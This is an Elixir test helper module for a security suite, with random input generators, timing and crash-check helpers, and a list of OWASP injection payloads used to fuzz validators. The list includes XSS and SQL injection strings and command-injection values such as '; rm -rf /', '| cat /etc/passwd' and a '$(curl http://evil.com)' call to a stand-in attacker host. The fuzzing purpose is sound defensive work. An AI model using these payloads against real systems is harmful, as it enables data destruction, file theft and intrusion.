defmodule Malachi.Test.SecurityHelper do
  @moduledoc """
  Shared helpers for the security test suite: random data generation, performance measurement, and
  common attack payloads (fuzzing the pure infra — validators, limiters — not the socket protocol).
  """

  @doc "Generate a random IPv4 tuple for testing."
  def random_ip do
    {:rand.uniform(254) + 1, :rand.uniform(254) + 1, :rand.uniform(254) + 1, :rand.uniform(254) + 1}
  end

  @doc "Generate a random IP string for ConnectionLimiter (which expects strings)."
  def random_ip_string do
    "#{:rand.uniform(254) + 1}.#{:rand.uniform(254) + 1}.#{:rand.uniform(254) + 1}.#{:rand.uniform(254) + 1}"
  end

  @doc "Generate N random bytes as a binary."
  def random_binary(size) when size > 0 do
    :crypto.strong_rand_bytes(size)
  end

  def random_binary(0), do: <<>>

  @doc "Generate a random string of printable ASCII characters."
  def random_ascii_string(length) when length > 0 do
    for _ <- 1..length, into: "", do: <<Enum.random(32..126)>>
  end

  def random_ascii_string(0), do: ""

  @doc "Generate a random unicode string."
  def random_unicode_string(length) when length > 0 do
    for _ <- 1..length, into: "" do
      # Safe unicode range that won't produce invalid UTF-8
      codepoint = Enum.random(0x0020..0x07FF)
      <<codepoint::utf8>>
    end
  end

  def random_unicode_string(0), do: ""

  @doc "Measure average execution time in microseconds over N iterations."
  def measure_avg_us(fun, iterations) when iterations > 0 do
    {total_us, _} =
      :timer.tc(fn ->
        for _ <- 1..iterations, do: fun.()
      end)

    total_us / iterations
  end

  @doc """
  Assert that a function never raises for any of the given inputs.
  Returns a list of {input, result} tuples.
  """
  def assert_no_crash(fun, inputs) do
    Enum.map(inputs, fn input ->
      result =
        try do
          {:ok, fun.(input)}
        rescue
          e -> {:crash, input, e}
        end

      case result do
        {:crash, input, e} ->
          raise "Crash on input #{inspect(input, limit: 100)}: #{inspect(e)}"

        {:ok, val} ->
          {input, val}
      end
    end)
  end

  @doc "Common OWASP injection payloads for security testing."
  def owasp_injection_payloads do
    [
      # XSS
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('XSS')>",
      "javascript:alert(1)",
      # SQL Injection
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users--",
      # Command Injection
      "; rm -rf /",
      "| cat /etc/passwd",
      "&& whoami",
      "$(curl http://evil.com)",
      "`id`",
      # Path Traversal
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32",
      "....//....//etc/passwd",
      # CRLF Injection
      "\r\nInjected-Header: evil",
      "name\r\n\r\nHTTP/1.1 200 OK",
      # Template injection
      "${7*7}",
      "{{7*7}}"
    ]
  end

  @doc "Generate a unique test username."
  def unique_username(prefix \\ "sectest") do
    "#{prefix}_#{:erlang.unique_integer([:positive])}"
  end

  @doc "Generate a unique queue name."
  def unique_queue_name(prefix \\ "sectest_q") do
    "#{prefix}_#{:erlang.unique_integer([:positive])}"
  end

  @doc "Format IP tuple as string for ConnectionLimiter."
  def ip_to_string({a, b, c, d}), do: "#{a}.#{b}.#{c}.#{d}"
end
